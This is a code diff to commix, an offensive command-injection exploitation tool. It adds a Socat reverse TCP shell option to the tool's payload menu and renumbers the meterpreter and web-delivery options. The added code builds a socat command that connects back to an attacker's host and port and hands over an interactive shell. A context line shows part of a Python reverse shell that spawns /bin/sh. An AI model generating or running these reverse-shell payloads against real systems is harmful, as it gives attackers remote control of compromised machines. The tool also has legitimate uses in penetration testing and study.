@@ -277,11 +277,12 @@ Type '""" + Style.BRIGHT + """1""" + Style.RESET_ALL + """' to use a PHP reverse
 Type '""" + Style.BRIGHT + """2""" + Style.RESET_ALL + """' to use a Perl reverse TCP shell.
 Type '""" + Style.BRIGHT + """3""" + Style.RESET_ALL + """' to use a Ruby reverse TCP shell. 
 Type '""" + Style.BRIGHT + """4""" + Style.RESET_ALL + """' to use a Python reverse TCP shell.
+Type '""" + Style.BRIGHT + """5""" + Style.RESET_ALL + """' to use a Socat reverse TCP shell.
 \n---[ """ + Style.BRIGHT + Fore.BLUE  + """Meterpreter reverse TCP shells""" + Style.RESET_ALL + """ ]---
-Type '""" + Style.BRIGHT + """5""" + Style.RESET_ALL + """' to use a PHP meterpreter reverse TCP shell.
-Type '""" + Style.BRIGHT + """6""" + Style.RESET_ALL + """' to use a Python meterpreter reverse TCP shell. 
-Type '""" + Style.BRIGHT + """7""" + Style.RESET_ALL + """' to use a Windows meterpreter reverse TCP shell. 
-Type '""" + Style.BRIGHT + """8""" + Style.RESET_ALL + """' to use the web delivery script. 
+Type '""" + Style.BRIGHT + """6""" + Style.RESET_ALL + """' to use a PHP meterpreter reverse TCP shell.
+Type '""" + Style.BRIGHT + """7""" + Style.RESET_ALL + """' to use a Python meterpreter reverse TCP shell. 
+Type '""" + Style.BRIGHT + """8""" + Style.RESET_ALL + """' to use a Windows meterpreter reverse TCP shell. 
+Type '""" + Style.BRIGHT + """9""" + Style.RESET_ALL + """' to use the web delivery script. 
 
 commix(""" + Style.BRIGHT + Fore.RED + """reverse_tcp_other""" + Style.RESET_ALL + """) > """)
     # PHP-reverse-shell
@@ -324,8 +325,14 @@ commix(""" + Style.BRIGHT + Fore.RED + """reverse_tcp_other""" + Style.RESET_ALL
                     "p=subprocess.call([\"/bin/sh\",\"-i\"])%0d'"
       break
 
-    # PHP-reverse-shell (meterpreter)
+    # Socat-reverse-shell 
     elif other_shell == '5':
+      other_shell = "socat tcp-connect:" + settings.LHOST + ":" + settings.LPORT + \
+                    " exec:\"sh\",pty,stderr,setsid,sigint,sane"
+      break
+
+    # PHP-reverse-shell (meterpreter)
+    elif other_shell == '6':
 
       if not os.path.exists(settings.METASPLOIT_PATH):
         error_msg = settings.METASPLOIT_ERROR_MSG
@@ -369,7 +376,7 @@ commix(""" + Style.BRIGHT + Fore.RED + """reverse_tcp_other""" + Style.RESET_ALL
       break
 
     # Python-reverse-shell (meterpreter)
-    elif other_shell == '6':
+    elif other_shell == '7':
 
       if not os.path.exists(settings.METASPLOIT_PATH):
         error_msg = settings.METASPLOIT_ERROR_MSG
@@ -414,7 +421,7 @@ commix(""" + Style.BRIGHT + Fore.RED + """reverse_tcp_other""" + Style.RESET_ALL
       break
     
     # Powershell injection attacks
-    elif other_shell == '7':
+    elif other_shell == '8':
       if not settings.TARGET_OS == "win":
         windows_only_attack_vector()
         continue
@@ -537,7 +544,7 @@ commix(""" + Style.BRIGHT + Fore.RED + """windows_meterpreter_reverse_tcp""" + S
       break
     
     # Web delivery script
-    elif other_shell == '8':
+    elif other_shell == '9':
       while True:
         web_delivery = raw_input("""
 ---[ """ + Style.BRIGHT + Fore.BLUE + """Web delivery script""" + Style.RESET_ALL + """ ]---
